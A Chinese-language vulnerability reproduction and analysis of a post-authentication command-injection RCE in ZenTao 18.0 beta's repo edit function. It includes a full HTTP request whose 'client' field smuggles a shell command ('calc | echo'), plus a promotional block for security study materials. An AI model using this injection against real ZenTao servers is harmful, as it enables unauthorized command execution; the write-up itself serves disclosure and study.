## 漏洞简介

禅道是第一款国产的开源项目管理软件。它集产品管理、项目管理、质量管理、文档管理、
组织管理和事务管理于一体，是一款专业的研发项目管理软件，完整地覆盖了项目管理的核心流程。
禅道管理思想注重实效，功能完备丰富，操作简洁高效，界面美观大方，搜索功能强大，统计报表丰富多样，软件架构合理，扩展灵活，有完善的 API 可以调用。

禅道后台存在 RCE 漏洞，均存在于历史版本，对这些漏洞进行复现分析。

## 环境搭建

源码下载地址
<https://dl.cnezsoft.com/zentao/18.0.beta1/ZenTaoPMS.18.0.beta1.php7.2_7.4.zip>

利用 phpstudy 来进行环境的搭建

![image](https://image.3001.net/images/20230824/1692864692_64e710b436282cf04a5a2.png!small)​

‍

## 漏洞复现

登录后台创建 GitLab 类型的代码库

![image](https://image.3001.net/images/20230824/1692864694_64e710b6538bb783951a1.png!small)

![image](https://image.3001.net/images/20230824/1692864695_64e710b7d434aae7ad527.png!small)

点击 DevOps 模块的设置选项，修改创建的代码库

![image](https://image.3001.net/images/20230824/1692864697_64e710b97306ecbfa0cdc.png!small)

![image](https://image.3001.net/images/20230824/1692864698_64e710baaf96afbeae9bd.png!small)

点击保存并抓取数据包

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

修改参数 SCM 和 client SCM 修改为 `Subversion`​ client 修改为 `calc | echo "`​

![image](https://image.3001.net/images/20230824/1692864700_64e710bc5e52583095403.png!small)

触发了命令执行，执行了两次

![image](https://image.3001.net/images/20230824/1692864702_64e710be185be5c700912.png!small)​​

####

## 漏洞分析

发现有一些分析文章中描述需要先创建一个代码仓库，也指出了创建代码仓库的原因，因为调用的是 edit 方法，所以要先 create

经过调试发现这是必须的，因为在没创建代码库时，执行 edit 方法，会提示跳转去创建代码库

`module/repo/control.php#commonAction`​

![image](https://image.3001.net/images/20230824/1692864704_64e710c02497e7c5fadf7.png!small)

所以需要先创建代码库

`module/repo/control.php#create`​

![image](https://image.3001.net/images/20230824/1692864705_64e710c1eb5cbe67c2f58.png!small)

`module/repo/model.php#create`​

![image](https://image.3001.net/images/20230824/1692864707_64e710c3958977f259f19.png!small)

在创建代码库的时候有一个检查 Client 的操作 只有选择 Gitlab 才能不做客户端的检测操作，直接创建成功

`module/repo/model.php#checkClient`​

![image](https://image.3001.net/images/20230824/1692864709_64e710c55b120ae910aae.png!small)

创建成功后执行编辑操作触发漏洞

    
    
    POST /index.php?m=repo&f=edit&repoID=0 HTTP/1.1  
    Host: test.test  
    Content-Length: 36  
    Accept: application/json, text/javascript, */*; q=0.01  
    X-Requested-With: XMLHttpRequest  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36  
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8  
    Origin: http://test.test  
    Referer: http://test.test/index.php?m=repo&f=edit&repoID=1&objectID=0  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-CN,zh;q=0.9  
    Cookie: zentaosid=bp9k0pcftu49b2ethm9f32hc5b; lang=zh-cn; device=desktop; theme=default; preExecutionID=1; moduleBrowseParam=0; productBrowseParam=0; executionTaskOrder=status%2Cid_desc; windowWidth=1440; windowHeight=722; tab=devops; repoBranch=master;XDEBUG_SESSION=PHPSTORM  
    Connection: close  
    ​  
    SCM=Subversion&client= calc | echo "

`module/repo/control.php#edit`​

![image](https://image.3001.net/images/20230824/1692864710_64e710c6bd399d265cd2a.png!small)

`module/repo/model.php#update`​

![image](https://image.3001.net/images/20230824/1692864712_64e710c8ab435fcf9c816.png!small)

`module/repo/model.php#checkConnection`​

![image](https://image.3001.net/images/20230824/1692864714_64e710ca044c98fe8167e.png!small)

​

![image](https://image.3001.net/images/20230824/1692864715_64e710cbda30f570b9ffc.png!small)​​​

## 修复建议

更新至最新版本

 **更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**

  

